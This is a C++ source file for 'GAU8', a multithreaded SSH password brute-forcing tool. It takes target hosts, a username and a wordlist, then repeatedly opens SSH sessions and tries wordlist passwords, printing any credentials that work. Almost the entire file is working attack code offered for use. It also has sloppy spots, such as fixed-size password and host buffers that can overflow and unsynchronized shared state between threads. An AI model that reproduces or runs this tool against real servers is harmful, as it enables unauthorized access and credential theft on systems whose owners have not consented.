#include "./lib/connectors.hpp"
//#include <cstdio>
//#include <cstdlib>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <thread>
#include <mutex>
#include <vector>
#include <chrono>
#include <cstring>

//   /$$$$$$$  /$$$$$$$$ /$$      /$$       /$$$$$$       /$$   /$$  /$$$$$$  /$$$$$$$$        /$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$
//  | $$__  $$|__  $$__/| $$  /$ | $$      |_  $$_/      | $$  | $$ /$$__  $$| $$_____/       /$$__  $$| $$__  $$ /$$__  $$| $$  | $$
//  | $$  \ $$   | $$   | $$ /$$$| $$        | $$        | $$  | $$| $$  \__/| $$            | $$  \ $$| $$  \ $$| $$  \__/| $$  | $$
//  | $$$$$$$    | $$   | $$/$$ $$ $$        | $$        | $$  | $$|  $$$$$$ | $$$$$         | $$$$$$$$| $$$$$$$/| $$      | $$$$$$$$
//  | $$__  $$   | $$   | $$$$_  $$$$        | $$        | $$  | $$ \____  $$| $$__/         | $$__  $$| $$__  $$| $$      | $$__  $$
//  | $$  \ $$   | $$   | $$$/ \  $$$        | $$        | $$  | $$ /$$  \ $$| $$            | $$  | $$| $$  \ $$| $$    $$| $$  | $$
//  | $$$$$$$/   | $$   | $$/   \  $$       /$$$$$$      |  $$$$$$/|  $$$$$$/| $$$$$$$$      | $$  | $$| $$  | $$|  $$$$$$/| $$  | $$
//  |_______/    |__/   |__/     \__/      |______/       \______/  \______/ |________/      |__/  |__/|__/  |__/ \______/ |__/  |__/



#define LINNUX_COMMAND_ERR 128


int main(int argc, char** argv)
{
    fprintf(stdout,"GAU8....\n\n");

    //User license

    std::string f_license_arg;

    uint16_t port = 22, num_of_threads_per_host = 1, attempts_per_conn = 3;
    std::vector<std::string> hosts;
    std::vector<std::thread*> threads;
    std::mutex m_lock_pass;
    std::ifstream wordlist, hosts_file;
    const char* user = nullptr;
    long long attempt_counter = 0;
    for(uint16_t i = 1; i < argc; i++)
    {
        if(!strcmp(argv[i], "-iL") || !strcmp(argv[i], "--hosts-file"))
        {
            if(hosts.size())
            {
                std::cout << "Can not use both -iL and -i!\n" << std::endl;
                return LINNUX_COMMAND_ERR; 
            }
            char host[16]; 
            hosts_file.open(argv[++i]);
            while(hosts_file >> host)
            {
                hosts.push_back(host);
            }
        }else if(!strcmp(argv[i], "-w") || !strcmp(argv[i], "--wordlist"))
        {
            wordlist.open(argv[++i]);
        }else if(!strcmp(argv[i], "-th") || !strcmp(argv[i], "--threads-per-host"))
        {
            num_of_threads_per_host = atoi(argv[++i]);
        }else if(!strcmp(argv[i], "-p") || !strcmp(argv[i], "--port"))
        {
            port = atoi(argv[++i]);
        }else if(!strcmp(argv[i], "-i") || !strcmp(argv[i], "--host"))
        {
            if(hosts.size())
            {
                std::cout << "Can not use both -iL and -i!\n" << std::endl;
                return LINNUX_COMMAND_ERR; 
            }
            hosts.push_back(argv[++i]);
        }else if(!strcmp(argv[i], "-u") || !strcmp(argv[i], "--user"))
        {
            user = argv[++i];
        }else if(!strcmp(argv[i], "-a") || !strcmp(argv[i], "--attempts-per-session"))
        {
            attempts_per_conn = atoi(argv[++i]);
        }
    }

    if(!hosts.size() || user == nullptr || !wordlist.is_open() )
    {
        std::cout << "USAGE: " << argv[0] << " + options \nOPTIONS: \n      -i/--host                    IP Address of one target\n      -iL/--hosts-file             File Containing targets\n      -u/--user                    Username\n      -w/--wordlist                Wordlist\n      -p/--port                    Port (Optional)\n      -th/--threads-per-host       Threads per host (Optional)\n      -a/--attempts-per-session    Password Attempts per SSH session" << std::endl;
        return LINNUX_COMMAND_ERR;
    }
//Check if all args are passed from the command line


    for(uint16_t host_index = 0; host_index < hosts.size(); ++host_index)
    {
        for(uint16_t i = 1; i <= num_of_threads_per_host; i++)
        {
            //add all threads to the vector of threads 
            std::cout << "Initializing thread " << i << " for host " << hosts[host_index];
            threads.push_back(new std::thread([&](){
                static std::string host = hosts[host_index];
                char f_password[15];
                while(true)
                {
                    //basically create a new ssh connection and session, try [attempts_per_conn] passwords, then kill it
                    int handle;
                    gau8::ssh* f_ssh = new gau8::ssh(host.c_str(), port, handle);
                    while(handle)
                    {
                        //some ssh servers might refuse connections, so block the thread until 
                        delete f_ssh; 
                        f_ssh = new gau8::ssh(host.c_str(), port, handle);
                        std::this_thread::sleep_for(std::chrono::milliseconds(250));
                    }
                    for(uint16_t i = 1; i <= attempts_per_conn; i++)
                    {
                        if(m_lock_pass.try_lock())
                        {
                            //Lock the wordlist and read one password
                            wordlist >> f_password;
                            //raise the counter for the number of attempts
                            attempt_counter++;
                            m_lock_pass.unlock();
                        }
    
                        //try to authenticate via the username that the connection was created with and the password that was read above
                        if(f_ssh->auth_user_pass(user, f_password))
                        {                
                            //print the successful attempt
                            std::cout << "ATTEMPT " << attempt_counter << " - Auth successful for user " << user << ":" << f_password;
                            std::cout << "\r";
                        }else
                        {
                            //print the unsuccessful attempt
                            std::cout << "ATTEMPT " << attempt_counter << " - Auth failed for user " << user << ":" << f_password;
                            std::cout << "\r";

                        }
                    }
                    delete f_ssh;
                }
            }));
            std::cout << " - DONE                                                     \r";
        }
    }
    std::cin.get();
    for(uint16_t i = 0; i < num_of_threads_per_host * (hosts.size() - 1); i++)
    {
        threads[i]->detach();
        delete threads[i];
    }
    return EXIT_SUCCESS;
}
